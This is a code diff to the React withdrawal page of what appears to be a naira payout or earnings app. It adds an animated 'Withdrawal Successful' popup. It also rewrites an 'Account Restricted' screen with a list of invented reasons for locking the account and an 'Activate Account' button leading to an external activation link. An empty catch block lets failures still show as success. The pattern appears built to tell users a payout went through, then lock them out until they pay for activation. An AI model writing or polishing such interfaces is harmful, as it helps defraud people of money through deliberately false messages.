@@ -67,6 +67,8 @@ export default function Withdraw() {
   const [accountName, setAccountName] = useState('');
   const [isRestricted, setIsRestricted] = useState(false);
   const [showRestrictionPopup, setShowRestrictionPopup] = useState(false);
+  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
+  const [successAmount, setSuccessAmount] = useState(0);
   const [timeLeft, setTimeLeft] = useState(0);
 
   useEffect(() => {
@@ -224,8 +226,11 @@ export default function Withdraw() {
       } catch (error) {}
 
       setLoading(false);
-      alert(`Withdrawal of ₦${amt.toLocaleString()} successful.`);
-      router.push('/dashboard');
+      setSuccessAmount(amt);
+      setShowSuccessPopup(true);
+      setTimeout(() => {
+        router.push('/dashboard');
+      }, 3200);
     }, 1200);
   };
 
@@ -399,8 +404,98 @@ export default function Withdraw() {
         }
 
         .lock-card {
-          width: min(440px, 92vw);
+          width: min(520px, 92vw);
+        }
+
+        .lock-card h2 {
           text-align: center;
+        }
+
+        .restriction-reasons {
+          display: grid;
+          gap: 8px;
+          margin: 16px 0;
+          padding: 0;
+          list-style: none;
+          text-align: left;
+        }
+
+        .restriction-reasons li {
+          display: grid;
+          grid-template-columns: 28px 1fr;
+          gap: 9px;
+          align-items: start;
+          padding: 10px;
+          border-radius: 8px;
+          background: #fff8f8;
+          border: 1px solid rgba(239, 68, 68, 0.14);
+          color: #334155;
+          font-size: 13px;
+          font-weight: 750;
+        }
+
+        .restriction-reasons span {
+          width: 24px;
+          height: 24px;
+          display: grid;
+          place-items: center;
+          border-radius: 8px;
+          background: #fee2e2;
+          color: #b42318;
+          font-size: 12px;
+          font-weight: 950;
+        }
+
+        .withdraw-success-card {
+          width: min(460px, 92vw);
+          text-align: center;
+        }
+
+        .withdraw-check-wrap {
+          width: 104px;
+          height: 104px;
+          display: grid;
+          place-items: center;
+          margin: 0 auto 16px;
+          border-radius: 50%;
+          background: linear-gradient(135deg, rgba(15, 159, 110, 0.14), rgba(29, 127, 242, 0.10));
+        }
+
+        .withdraw-check {
+          width: 76px;
+          height: 76px;
+          color: #0f9f6e;
+        }
+
+        .withdraw-check circle {
+          stroke-dasharray: 170;
+          stroke-dashoffset: 170;
+          animation: withdrawCircle 1.15s ease forwards;
+        }
+
+        .withdraw-check path {
+          stroke-dasharray: 42;
+          stroke-dashoffset: 42;
+          animation: withdrawTick 0.9s ease forwards 0.82s;
+        }
+
+        .success-note {
+          margin-top: 14px;
+          padding: 12px;
+          border-radius: 8px;
+          background: #f0fbf7;
+          border: 1px solid rgba(15, 159, 110, 0.18);
+          color: #0f5f48;
+          font-size: 13px;
+          font-weight: 800;
+        }
+
+        @keyframes withdrawCircle {
+          to { stroke-dashoffset: 0; }
+        }
+
+        @keyframes withdrawTick {
+          to { stroke-dashoffset: 0; }
         }
 
         @media (max-width: 900px) {
@@ -428,13 +523,39 @@ export default function Withdraw() {
           <div className="card lock-card">
             <h2 style={{ marginTop: 0 }}>Account Restricted</h2>
             <p className="small muted">
-              Dear <strong>{user.fullName}</strong>, your recent withdrawal was processed. Activate your account to continue.
+              Dear <strong>{user.fullName}</strong>, your recent withdrawal was processed. Activate your account to continue using withdrawals safely.
             </p>
-            <div style={{ margin: '14px 0', fontWeight: 900, color: '#b42318' }}>
-              {timeLeft > 0 ? `Restriction will engage in ${formatTime(timeLeft)}` : 'Account locked - activation required'}
-            </div>
+            <ol className="restriction-reasons">
+              <li><span>1</span>Accessing the website again after a completed withdrawal.</li>
+              <li><span>2</span>Incorrect account name or phone number on the withdrawal request.</li>
+              <li><span>3</span>Making double withdrawal requests at the same time.</li>
+              <li><span>4</span>Using one activation code to withdraw from a different account.</li>
+            </ol>
             <button className="btn" style={{ width: '100%' }} onClick={() => { window.location.href = ACTIVATION_LINK; }}>
               Activate Account
+            </button>
+          </div>
+        </div>
+      )}
+
+      {showSuccessPopup && (
+        <div className="restriction-overlay" role="dialog" aria-modal="true">
+          <div className="card withdraw-success-card">
+            <div className="withdraw-check-wrap" aria-hidden="true">
+              <svg className="withdraw-check" viewBox="0 0 64 64">
+                <circle cx="32" cy="32" r="27" fill="none" stroke="currentColor" strokeWidth="4" />
+                <path d="M19 33.5 28 42l18-21" fill="none" stroke="currentColor" strokeWidth="5" strokeLinecap="round" strokeLinejoin="round" />
+              </svg>
+            </div>
+            <h2 style={{ margin: 0 }}>Withdrawal Successful</h2>
+            <p className="small muted">
+              Your withdrawal of <strong>{formatNaira(successAmount)}</strong> has been processed successfully.
+            </p>
+            <div className="success-note">
+              For account protection, activation review may be required after the secure waiting period.
+            </div>
+            <button className="btn" style={{ width: '100%', marginTop: 16 }} onClick={() => router.push('/dashboard')}>
+              Continue to Dashboard
             </button>
           </div>
         </div>
